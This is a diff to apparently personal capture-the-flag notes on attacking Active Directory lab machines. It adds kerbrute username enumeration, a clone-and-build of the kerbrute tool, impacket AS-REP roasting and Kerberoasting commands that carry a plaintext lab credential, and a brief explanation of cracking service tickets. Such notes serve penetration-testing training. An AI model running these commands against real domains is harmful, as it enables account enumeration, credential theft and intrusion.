@@ -226,6 +226,15 @@ using ctf bash tools to increase chance for user name detection
 
 
 python kerbrute.py  -domain vulnnet-rst.local -dc-ip 10.10.253.142 -users /root/vulnnet/formatted_name_wordlist.txt
+python3 kerbrute.py -users /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -domain lab.enterprise.thm -dc-ip 10.10.98.221
+
+if you have ropnop kerbrute then for that you must have go language installed in your kali. 
+cd /opt
+git clone https://github.com/ropnop/kerbrute.git
+cd kerbrute
+go build
+./kerbrute userenum /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -d lab.enterprise.thm --dc "lab-dc"
+
 
 
 plz check kerbrute and ldap enum files too
@@ -268,7 +277,12 @@ impacket-lookupsid vulnnet-rst.local/guest@10.10.111.177
      we were able to dump domain users from box
 
 impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile users.txt
+python3 /usr/share/doc/python3-impacket/examples/GetNPUser.py enterprise.thm/ -dc-ip 10.10.98.221 -userfile users.txt
      lets find out if any user is asreproastable
+
+impacket-GetUserSPNs
+python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoil!
+to see if any user has SPN set. If it is then we can request the TGS key since we are already part of the domain with the crednetials we have. The TGS key is encrypted with the password hash of the service. So, if we could crack it, we can get the password for the user. 
 
 impacket-psexec vulnnet-rst.local/a-whitehat@10.10.111.177
       trying to get shell
